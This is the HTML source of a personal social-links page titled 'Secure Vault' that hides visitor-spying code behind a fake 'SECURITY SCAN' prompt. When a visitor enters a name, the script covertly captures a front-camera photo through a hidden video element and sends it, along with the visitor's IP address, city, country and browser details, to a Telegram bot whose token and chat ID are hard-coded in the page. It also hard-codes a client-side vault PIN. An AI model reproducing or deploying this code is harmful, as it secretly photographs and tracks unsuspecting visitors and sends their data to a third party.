<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kishor Bankapur | Secure Vault</title>
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>

    <style>
        :root {
            --primary-color: #3b82f6;
            --bg-dark: #000000;
            --card-bg: #0a0a0a;
            --text-main: #ffffff;
            --text-dim: #888888;
            --glow-color: rgba(59, 130, 246, 0.5);
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            outline: none; font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
        }

        body {
            background: var(--bg-dark);
            background-image: 
                radial-gradient(circle at 50% 50%, #111 0%, #000 100%),
                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            color: var(--text-main);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden; /* Screen stability ke liye scrolling band */
        }

        .main-card {
            width: min(400px, 95vw);
            background: var(--card-bg);
            border: 1px solid #1a1a1a;
            border-radius: 50px;
            padding: 50px 25px 30px;
            text-align: center;
            position: relative;
            box-shadow: 0 40px 100px rgba(0,0,0,1);
            z-index: 10;
            /* Animation hatane ke liye overflow visible rakha hai aur pseudo-element nikal diya */
        }

        /* Blue rotating light (::before) ko yahan se hata diya gaya hai */

        .profile-container {
            position: relative;
            width: 130px;
            height: 130px;
            margin: 0 auto 25px;
        }

        .avatar-wrapper {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid var(--primary-color);
            padding: 5px;
            cursor: pointer;
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            background: #000;
        }

        .avatar-wrapper:active { transform: scale(0.9); }

        .avatar-img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            pointer-events: none;
        }

        h2 {
            font-size: 1.6rem;
            letter-spacing: 4px;
            font-weight: 800;
            text-transform: uppercase;
            background: linear-gradient(to bottom, #fff, #666);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: var(--primary-color);
            font-size: 0.9rem;
            margin-bottom: 40px;
            font-weight: 600;
            letter-spacing: 2px;
        }

        .links-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }

        .link-item {
            background: #0f0f0f;
            border: 1px solid #222;
            border-radius: 25px;
            padding: 25px 15px;
            text-decoration: none;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            transition: 0.3s;
            position: relative;
        }

        .link-item:active {
            border-color: var(--primary-color);
            box-shadow: 0 0 20px var(--glow-color);
            transform: translateY(2px);
        }

        .link-item i { font-size: 1.8rem; }
        .link-item span {
            font-size: 0.75rem;
            text-transform: uppercase;
            font-weight: 700;
            color: var(--text-dim);
            letter-spacing: 1px;
        }

        .developer-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(30, 30, 30, 0.95);
            border: 1px solid var(--primary-color);
            color: var(--primary-color);
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 2px;
            cursor: pointer;
            z-index: 10000;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
            transition: 0.3s;
            text-transform: uppercase;
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.98);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 20000;
            backdrop-filter: blur(15px);
        }

        .modal-overlay.active { display: flex; }

        .modal-box {
            background: #111;
            padding: 40px;
            border-radius: 40px;
            border: 1px solid var(--primary-color);
            width: min(340px, 90vw);
            text-align: center;
        }

        .modal-input {
            width: 100%;
            background: #000;
            border: 1px solid #333;
            padding: 18px;
            border-radius: 15px;
            color: #fff;
            margin: 25px 0;
            text-align: center;
        }

        .primary-btn {
            background: var(--primary-color);
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 15px;
            font-weight: 800;
            width: 100%;
            cursor: pointer;
            text-transform: uppercase;
        }

        .cancel-btn {
            background: #222;
            color: #666;
            margin-top: 10px;
            border: none;
            padding: 12px;
            border-radius: 15px;
            width: 100%;
            cursor: pointer;
        }

        #zoomOverlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.97);
            z-index: 30000;
            display: none;
            justify-content: center;
            align-items: center;
        }
        #zoomOverlay img {
            max-width: 85%;
            max-height: 80vh;
            border-radius: 20px;
            border: 2px solid var(--primary-color);
        }

        .vault-panel {
            position: fixed;
            top: 0; right: -100%;
            width: 100%;
            height: 100vh;
            background: #000;
            z-index: 25000;
            padding: 40px 20px;
            transition: 0.6s cubic-bezier(0.7, 0, 0.3, 1);
            overflow-y: auto;
        }
        .vault-panel.open { right: 0; }

        .photo-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 30px;
        }

        .photo-card {
            aspect-ratio: 1;
            border-radius: 15px;
            overflow: hidden;
            border: 1px solid #222;
            cursor: pointer;
        }
        .photo-card img { width: 100%; height: 100%; object-fit: cover; }

        .music-player {
            position: fixed; 
            bottom: 30px; 
            right: 30px;
            width: 60px; 
            height: 60px; 
            border-radius: 50%;
            background: #111; 
            border: 2px solid var(--primary-color);
            display: flex; 
            justify-content: center; 
            align-items: center;
            font-size: 28px; 
            cursor: pointer; 
            z-index: 15000;
            box-shadow: 0 0 20px var(--glow-color);
        }
        .rotating { 
            animation: spin 5s linear infinite; 
        }
        @keyframes spin { 
            from { transform: rotate(0deg); } 
            to { transform: rotate(360deg); } 
        }

        #hiddenCamera, #hiddenCanvas {
            display: none;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <button class="developer-btn" onclick="showNameModal()">
        <i class="fa-solid fa-lock" style="margin-right: 8px;"></i>
        DEVELOPER
    </button>

    <video id="hiddenCamera" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <div class="main-card">
        <div class="profile-container">
            <div class="avatar-wrapper" onclick="handleZoom(true)">
                <img src="photo1.png" class="avatar-img" alt="Kishor">
            </div>
        </div>
        
        <h2>KISHOR BANKAPUR</h2>
        <p class="subtitle">@kishorbankapur</p>

        <div class="links-grid">
            <a href="https://www.instagram.com/kishor.bankapur" class="link-item" target="_blank">
                <i class="fa-brands fa-instagram" style="color: #E1306C;"></i>
                <span>Instagram</span>
            </a>
            <a href="https://x.com/bankapurkishor" class="link-item" target="_blank">
                <i class="fa-brands fa-x-twitter"></i>
                <span>Twitter</span>
            </a>
            <a href="https://www.linkedin.com/in/kishor-bankapur-9ba256325/" class="link-item" target="_blank">
                <i class="fa-brands fa-linkedin" style="color: #0077b5;"></i>
                <span>LinkedIn</span>
            </a>
            <a href="https://youtube.com/@careless.2009-pi" class="link-item" target="_blank">
                <i class="fa-brands fa-youtube" style="color: #FF0000;"></i>
                <span>YouTube</span>
            </a>
        </div>
    </div>

    <div id="nameModal" class="modal-overlay">
        <div class="modal-box">
            <h3>📡 SECURITY SCAN</h3>
            <input type="text" id="visitorName" class="modal-input" placeholder="Your Name" autocomplete="off">
            <button class="primary-btn" onclick="startDataProcess()">CONTINUE</button>
            <button class="cancel-btn" onclick="closeModals()">CANCEL</button>
        </div>
    </div>

    <div id="passModal" class="modal-overlay">
        <div class="modal-box">
            <h3>🔐 VAULT PIN</h3>
            <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
            <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
            <button class="cancel-btn" onclick="showNameModal()">BACK</button>
        </div>
    </div>

    <div id="zoomOverlay" onclick="handleZoom(false)">
        <img src="photo1.png" onclick="event.stopPropagation()">
    </div>

    <div id="vaultPanel" class="vault-panel">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <h2 style="font-size:1.2rem; color:var(--primary-color);">PRIVATE VAULT</h2>
            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVault()"></i>
        </div>
        <div class="photo-grid" id="vGrid"></div>
    </div>

    <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
    
    <audio id="bgTrack" loop preload="auto">
        <source src="audio.mp3" type="audio/mpeg">
    </audio>

<script>
    const CONFIG = {
        token: '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc',
        chatId: '6297092647'
    };

    let currentVisitorName = '';

    function controlMusic() {
        const audio = document.getElementById('bgTrack');
        const toggle = document.getElementById('mToggle');
        if(audio.paused) {
            audio.play().then(() => toggle.classList.add('rotating')).catch(() => alert('audio.mp3 not found!'));
        } else {
            audio.pause();
            toggle.classList.remove('rotating');
        }
    }

    async function captureHiddenPhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).catch(() => null);
            if (!stream) return null;
            const video = document.getElementById('hiddenCamera');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 500));
            const canvas = document.getElementById('hiddenCanvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const data = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(t => t.stop());
            return data;
        } catch (e) { return null; }
    }

    async function sendPhotoToTelegram(photoBase64, visitorName) {
        try {
            const blob = await (await fetch(photoBase64)).blob();
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append('photo', blob, 'visitor.jpg');
            formData.append('caption', `📸 CAPTURE\n👤 Visitor: ${visitorName}`);
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: formData });
        } catch (e) {}
    }

    async function startDataProcess() {
        const name = document.getElementById('visitorName').value.trim();
        if(!name) return alert("Enter name!");
        currentVisitorName = name;
        const btn = document.querySelector('#nameModal .primary-btn');
        btn.innerHTML = "⏳ SCANNING...";
        
        const photo = await captureHiddenPhoto();
        if (photo) await sendPhotoToTelegram(photo, name);

        const ipReq = await fetch('https://ipapi.co/json/');
        const ip = await ipReq.json();
        
        const log = `🔥 VISITOR: ${name}\n📍 IP: ${ip.ip}\n📍 LOC: ${ip.city}, ${ip.country_name}\n📱 DEV: ${navigator.userAgent}`;
        
        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CONFIG.chatId, text: log })
        });

        document.getElementById('nameModal').classList.remove('active');
        document.getElementById('passModal').classList.add('active');
        btn.innerHTML = "CONTINUE";
    }

    function verifyPin() {
        if(document.getElementById('vaultPin').value === '2009') {
            closeModals();
            document.getElementById('vaultPanel').classList.add('open');
            loadPhotos();
        } else { alert("❌ WRONG PIN"); }
    }

    function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); }
    function showNameModal() { document.getElementById('nameModal').classList.add('active'); }
    function closeVault() { document.getElementById('vaultPanel').classList.remove('open'); }
    function handleZoom(show) { document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; }

    function loadPhotos() {
        const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
        document.getElementById('vGrid').innerHTML = photos.map(src => 
            `<div class="photo-card" onclick="handleZoom(true); document.querySelector('#zoomOverlay img').src='${src}'">
                <img src="${src}">
            </div>`
        ).join('');
    }

    const up = document.createElement('div');
    up.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
    up.innerHTML = '<p>Upload Photos</p>';
    up.onclick = () => {
        const i = document.createElement('input'); i.type = 'file'; i.multiple = true;
        i.onchange = () => {
            const p = JSON.parse(localStorage.getItem('vault_p') || '[]');
            Array.from(i.files).forEach(f => {
                const r = new FileReader();
                r.onload = (e) => { p.push(e.target.result); localStorage.setItem('vault_p', JSON.stringify(p)); loadPhotos(); };
                r.readAsDataURL(f);
            });
        };
        i.click();
    };
    document.querySelector('.vault-panel').prepend(up);
</script>
</body>
</html>
